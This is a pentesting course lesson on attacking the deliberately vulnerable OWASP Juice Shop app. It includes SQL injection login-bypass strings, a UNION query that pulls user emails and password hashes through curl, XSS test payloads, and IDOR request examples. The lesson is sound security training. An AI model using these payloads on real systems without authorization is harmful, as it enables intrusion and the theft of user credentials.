# 100-Day Pentesting Challenge
## Day 19: OWASP Juice Shop — Practical Web Vulnerabilities

> **Platform:** OWASP Juice Shop + TryHackMe + PortSwigger &nbsp;|&nbsp; **Difficulty:** Easy &nbsp;|&nbsp; **Time:** 2+ Hours

---

## What You'll Learn Today

| Topic | Why It Matters |
|---|---|
| Juice Shop Platform | A realistic vulnerable web application for hands-on practice |
| Practical SQL Injection | Perform SQL injection against a live application |
| Practical XSS | Practice reflected, stored and DOM XSS |
| Authentication Bypass | Learn common login bypass techniques |
| Broken Access Control | Access restricted functionality and resources |

> Today shifts from theory to practical exploitation. OWASP Juice Shop provides realistic scenarios for learning common web application vulnerabilities in a controlled environment. :contentReference[oaicite:0]{index=0}

---

## Resources

| # | Resource | Purpose |
|---|---|---|
| 1 | OWASP Juice Shop (TryHackMe) | Practical web challenges |
| 2 | Juice Shop Walkthrough | Learn challenge methodology |
| 3 | PortSwigger SQL Injection | SQLi theory and labs |
| 4 | PortSwigger XSS | XSS theory and labs |

---

## 2-Hour Schedule

| Time | Activity |
|---|---|
| 0:00 – 0:15 | Learn Juice Shop fundamentals |
| 0:15 – 0:40 | Watch walkthrough and understand workflow |
| 0:40 – 1:00 | Practice SQL Injection concepts |
| 1:00 – 1:20 | Learn XSS techniques |
| 1:20 – 1:40 | Deploy Juice Shop locally |
| 1:40 – 2:00 | Complete labs and prepare notes |

---

## Must-Know Concepts

### 1. What is OWASP Juice Shop?

OWASP Juice Shop is an intentionally vulnerable web application built for learning modern web application security.

Technology stack:

- Node.js
- Angular
- SQLite

It contains dozens of challenges covering nearly every OWASP Top 10 category.

---

### Running Juice Shop Locally

Install Docker:

```bash
sudo apt install docker.io -y
sudo systemctl start docker
```

Run Juice Shop:

```bash
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Open:

```text
http://localhost:3000
```

Stop the container:

```bash
docker ps
docker stop <container_id>
```

---

### Hidden Scoreboard

One of the first challenges is discovering the hidden scoreboard.

Example location:

```text
http://<ip>:3000/#/score-board
```

---

## 2. Reconnaissance

Always begin by understanding the application before testing.

---

### robots.txt

```bash
curl http://<ip>:3000/robots.txt
```

---

### sitemap.xml

```bash
curl http://<ip>:3000/sitemap.xml
```

---

### Review Page Source

Look for:

- JavaScript files
- Hidden routes
- API endpoints
- Comments
- Debug information

---

### Extract API Endpoints

```bash
curl -s http://<ip>:3000/main.js \
| grep -oE '"/api/[a-zA-Z/]+"' \
| sort -u
```

Useful routes include:

```text
/api/Users/

/api/Products/

/api/BasketItems/

/api/Feedbacks/

/api/Complaints/

/#/administration
```

---

### Configure Burp Suite

Workflow:

```text
Open Burp

↓

Enable Proxy

↓

Browse Juice Shop

↓

Review HTTP History

↓

Identify Interesting Requests
```

---

## 3. Practical SQL Injection

Login request:

```http
POST /rest/user/login

{
"email":"user@test.com",
"password":"password"
}
```

---

### Example SQL Injection Payloads

```text
' OR 1=1--

' OR '1'='1'--

admin'--

')) OR 1=1--

' OR 1=1#
```

---

### Burp Workflow

```text
Capture Login Request

↓

Send to Repeater

↓

Modify Email

↓

Send Request

↓

Analyze Response
```

---

### SQL Query Example

Original query:

```sql
SELECT *
FROM Users
WHERE email='INPUT'
AND password='HASH'
```

Injected query:

```sql
SELECT *
FROM Users
WHERE email=''
OR 1=1--
```

---

### Product Search Testing

```bash
curl "http://<ip>:3000/rest/products/search?q="
```

SQL injection test:

```bash
curl "http://<ip>:3000/rest/products/search?q='"
```

Union-based example:

```bash
curl "http://<ip>:3000/rest/products/search?q='))UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--"
```

---

### Indicators

- Login bypass
- Database errors
- Unexpected responses
- User data disclosure
- Authentication token returned

---

### Key Takeaways

- Start with reconnaissance before testing.
- Use Burp Suite to inspect every request.
- SQL Injection often begins with simple payloads.
- Observe response differences carefully.
- Document successful payloads for later reference.

---

### 4. Practical Cross-Site Scripting (XSS)

Cross-Site Scripting allows JavaScript supplied by a user to execute inside another user's browser.

Juice Shop includes multiple XSS challenges for practicing different attack types.

---

### XSS Categories

| Type | Description |
|---|---|
| Reflected XSS | Payload is reflected immediately in the response |
| Stored XSS | Payload is stored and executed for every visitor |
| DOM XSS | JavaScript modifies the page using untrusted client-side data |

---

### Basic Test Payloads

```html
<script>alert(1)</script>
```

```html
<img src=x onerror=alert(1)>
```

```html
<svg onload=alert(1)>
```

```html
"><script>alert(1)</script>
```

---

### Testing Workflow

```text
Locate Input Field

↓

Submit Payload

↓

Observe Response

↓

Inspect DOM

↓

Document Result
```

---

### Burp Workflow

```text
Capture Request

↓

Send to Repeater

↓

Replace Parameter

↓

Send Request

↓

Analyze Response
```

---

### Indicators

- JavaScript executes
- Alert dialog appears
- Payload stored successfully
- Reflected input rendered without encoding

---

## 5. Broken Access Control

Broken Access Control occurs when users can access resources or functionality outside their intended permissions.

Common examples include:

- Administrative pages
- User profile access
- Order history
- Basket manipulation
- Hidden routes

---

### Example Requests

```http
GET /rest/user/whoami
```

```http
GET /api/Users
```

```http
GET /#/administration
```

---

### Testing Workflow

```text
Login

↓

Capture Request

↓

Modify Identifier

↓

Replay Request

↓

Compare Response
```

---

### Indicators

- Access to another user's data
- Administrator functions exposed
- Missing authorization checks
- Sensitive information returned

---

## 6. Insecure Direct Object Reference (IDOR)

IDOR is a common form of Broken Access Control.

Applications expose object identifiers that can be modified by users.

Example:

```http
GET /api/users/1
```

Modified:

```http
GET /api/users/2
```

---

### Typical Parameters

```text
id

userId

orderId

productId

basketId

invoiceId
```

---

### Burp Testing

```text
Capture Request

↓

Send to Repeater

↓

Modify ID

↓

Send

↓

Observe Response
```

---

### 7. Authentication Bypass

Authentication weaknesses may allow unauthorized access.

Areas to review include:

- Login requests
- Password reset
- Session handling
- JWTs
- Cookies

---

### Login Request

```http
POST /rest/user/login
```

---

### Observe

- Status Code
- Response Body
- Authentication Token
- Cookies
- Redirects

---

### Session Review

Inspect:

```http
Set-Cookie
```

Review:

- Session ID
- JWT
- Expiration
- Security attributes

---

## 8. Sensitive Data Exposure

Review every response for unnecessary information.

Look for:

- Email addresses
- Password hashes
- API keys
- Internal paths
- Tokens
- Debug messages

---

### Useful Locations

```text
HTTP Responses

JavaScript Files

Comments

API Responses

Headers

Cookies
```

---

### Helpful Commands

```bash
curl http://localhost:3000/robots.txt
```

```bash
curl http://localhost:3000/sitemap.xml
```

```bash
curl -I http://localhost:3000
```

---

### Key Takeaways

- XSS testing begins with simple payloads.
- IDOR is often discovered by modifying identifiers.
- Authentication testing includes sessions and cookies.
- Sensitive information frequently appears in responses, headers and JavaScript.
- Burp Repeater is the primary tool for manual testing.

---

### 9. Challenge Workflow

A recommended workflow when solving Juice Shop challenges:

```text
Browse Application

↓

Capture Requests

↓

Review HTTP History

↓

Identify Parameters

↓

Send to Repeater

↓

Modify Requests

↓

Analyze Responses

↓

Document Findings
```

---

### Burp Suite Workflow

```text
Browser

↓

Burp Proxy

↓

HTTP History

↓

Repeater

↓

Intruder (if needed)

↓

Comparer

↓

Document Results
```

---

### Useful API Endpoints

Common endpoints encountered during practice:

```text
/api/Users/

/api/Products/

/api/BasketItems/

/api/Feedbacks/

/api/Complaints/

/rest/user/login

/rest/products/search

/rest/basket

/rest/order-history
```

Always inspect:

- Request Method
- Parameters
- Headers
- Cookies
- JSON Body
- Response Code

---

### Interesting Response Codes

| Code | Meaning |
|---|---|
| 200 | Success |
| 201 | Resource Created |
| 400 | Bad Request |
| 401 | Authentication Required |
| 403 | Forbidden |
| 404 | Resource Not Found |
| 500 | Internal Server Error |

Different response codes often indicate different application behavior.

---

### Manual Testing Checklist

Before using automated tools, verify:

- Authentication
- Authorization
- User identifiers
- Search functionality
- Product pages
- Basket functionality
- Profile pages
- Password reset
- API endpoints
- JavaScript files

---

### Useful Burp Tabs

| Tab | Purpose |
|---|---|
| Proxy | Capture requests |
| HTTP History | Review all traffic |
| Repeater | Manual testing |
| Intruder | Automated payload testing |
| Decoder | Encode and decode data |
| Comparer | Compare responses |

---

### Practical Workflow Summary

```text
Reconnaissance

↓

Review Source Code

↓

Browse Application

↓

Capture Requests

↓

Manual Testing

↓

Response Analysis

↓

Document Findings
```

---

## Quick Reference Cheatsheet

```text
Recon

robots.txt

sitemap.xml

JavaScript Files

API Endpoints

SQL Injection

' OR 1=1--

admin'--

Union Testing

XSS

<script>alert(1)</script>

<img src=x onerror=alert(1)>

Broken Access Control

Modify IDs

Review Roles

Authentication

Review Login

Cookies

JWT

Sensitive Data

Headers

JavaScript

Responses

Burp Workflow

Proxy

↓

HTTP History

↓

Repeater

↓

Comparer

↓

Documentation
```

---

## Day 19 Submission Task

```text
Complete the assigned OWASP Juice Shop challenges.

Practice:

• SQL Injection
• Cross-Site Scripting
• Broken Access Control
• Authentication Testing
• Sensitive Data Discovery

Capture requests using Burp Suite.

Document:

• Requests tested
• Payloads used
• Responses observed
• Interesting endpoints
• Lessons learned

Save everything in Markdown.

Push to:

100-days-pentest/
└── Day-19/

Include:

• Juice Shop completion screenshots
• Burp Suite screenshots
• HTTP requests
• Notes
```

---

### Bonus Challenge

```text
Deploy Juice Shop locally using Docker.

Complete at least five beginner challenges.

For each challenge record:

• Objective
• Request
• Payload
• Response
• Result
• Lessons Learned

Summarize everything in a Markdown report.
```

---

> **End of Day 19**

**Next Up:** **Day 20 — SQL Injection: Fundamentals & Manual Exploitation**

---
